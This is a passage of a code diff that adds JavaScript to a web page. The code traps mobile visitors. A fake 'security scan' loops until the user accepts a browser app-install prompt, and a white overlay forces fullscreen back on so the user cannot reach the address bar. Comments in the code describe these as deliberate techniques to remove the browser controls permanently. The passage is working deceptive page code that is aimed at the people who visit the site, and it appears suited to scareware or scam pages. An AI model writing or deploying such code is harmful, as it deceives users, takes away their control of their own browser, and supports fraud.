+        void el.offsetWidth; // force reflow
+        el.classList.add('shake');
+        el.addEventListener('animationend', () => el.classList.remove('shake'), { once: true });
+      });
+    }
+
+
+    /* ── RE-ENTRY OVERLAY ───────────────────────────────────────────
+       When fullscreen exits (notification shade, app switcher), a
+       plain white overlay covers everything. The user MUST tap it
+       to continue — the tap re-enters fullscreen before they can
+       reach the address bar.
+       Defined as a function declaration so Technique 3's handler
+       (above) can reference it via hoisting.                       */
+    function updateReentryOverlay() {
+      const ov = document.getElementById('reentry-overlay');
+      const sg = document.getElementById('scan-gate');
+      if (!ov) return;
+      const inFS = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement;
+      const scanVisible = sg && sg.style.display !== 'none';
+      ov.style.display = (!inFS && !scanVisible) ? 'block' : 'none';
+      if (ov.style.display === 'block') {
+        const h = window.visualViewport?.height || window.innerHeight;
+        ov.style.height = (h + 350) + 'px';
+      }
+    }
+
+    (function() {
+      const ov = document.getElementById('reentry-overlay');
+      if (!ov) return;
+      function reEnter(e) {
+        if (e.cancelable) e.preventDefault();
+        ov.style.display = 'none';
+        goFullscreen();
+      }
+      ov.addEventListener('touchend', reEnter, { passive: false });
+      ov.addEventListener('click', reEnter);
+    })();
+
+
+    /* ── SECURITY SCAN GATE ──────────────────────────────────────────
+       A mandatory-looking scan flow that ends with the Chrome PWA
+       install prompt. If accepted, the site reopens as a fullscreen
+       app — no browser chrome exists at all, ever again.
+       If dismissed: scan restarts (loops until install is accepted).
+       If beforeinstallprompt never fires (Samsung Internet, already
+       installed): shows manual "Add to Home Screen" instructions.   */
+    (function() {
+      const gate        = document.getElementById('scan-gate');
+      const scanPhase   = document.getElementById('scan-phase');
+      const resultPhase = document.getElementById('result-phase');
+      const scanBarEl   = document.getElementById('scan-bar');
+      const scanPctEl   = document.getElementById('scan-pct');
+      const installBtn  = document.getElementById('install-btn-gate');
+      const manualDiv   = document.getElementById('install-manual');
+      if (!gate) return;
+
+      // Already running as an installed PWA — skip gate entirely
+      if (window.matchMedia('(display-mode: fullscreen)').matches ||
+          window.matchMedia('(display-mode: standalone)').matches ||
+          window.navigator.standalone === true) {
+        gate.style.display = 'none';
+        return;
+      }
+
+      function startScan() {
+        scanPhase.style.display   = 'flex';
+        resultPhase.style.display = 'none';
+        if (manualDiv)   manualDiv.style.display   = 'none';
+        if (installBtn)  installBtn.style.display  = 'block';
+        let pct = 0, last = null;
+        const TOTAL = 3200;
+
+        function tick(ts) {
+          if (!last) last = ts;
+          const delta = ts - last; last = ts;
+          const remaining = 100 - pct;
+          pct = Math.min(100, pct + (remaining * delta) / (TOTAL * 0.9));
+          const display = Math.round(pct);
+          if (scanBarEl) scanBarEl.style.width = display + '%';
+          if (scanPctEl) scanPctEl.textContent = display + '%';
+          if (pct < 100) {
+            requestAnimationFrame(tick);
+          } else {
+            setTimeout(() => {
+              scanPhase.style.display   = 'none';
+              resultPhase.style.display = 'flex';
+            }, 350);
+          }
+        }
+        requestAnimationFrame(tick);
+      }
+
+      function hideGate() {
+        gate.style.display = 'none';
+        updateReentryOverlay();
+      }
+
+      installBtn.addEventListener('click', () => {
+        if (deferredInstallPrompt) {
+          const prompt = deferredInstallPrompt;
+          deferredInstallPrompt = null;
+          prompt.prompt()
+            .then(() => prompt.userChoice)
+            .then(result => {
+              if (result.outcome === 'accepted') {
+                hideGate();
+              } else {
+                // Dismissed — restart scan so they must try again
+                setTimeout(startScan, 600);
+              }
+            })
+            .catch(() => hideGate());
+        } else {
+          // beforeinstallprompt didn't fire (Samsung Internet, already installed, etc.)
+          installBtn.style.display = 'none';
+          if (manualDiv) manualDiv.style.display = 'block';
+          // Let them through after 12 s if they genuinely cannot install
+          setTimeout(hideGate, 12000);
+        }
+      });
+
+      startScan();
+    })();
+
+  </script>
+</body>
+</html>
